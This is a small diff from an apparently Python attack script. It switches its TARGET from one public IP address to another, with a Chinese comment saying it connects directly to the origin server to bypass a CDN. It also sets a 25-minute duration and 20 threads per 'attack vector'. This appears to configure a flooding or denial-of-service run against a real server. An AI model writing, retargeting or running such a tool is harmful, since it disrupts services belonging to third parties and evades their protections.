@@ -23,7 +23,7 @@ def mk_sess():
     return s
 from concurrent.futures import ThreadPoolExecutor
 
-TARGET = "https://3.37.4.229"  # v3: 直连源站 IP (绕过CDN)
+TARGET = "https://13.124.198.91"  # v3: 直连源站 IP (绕过CDN)
 DURATION = 25 * 60  # 25 minutes
 THREADS_PER_VECTOR = 20  # 20 threads per attack vector
 
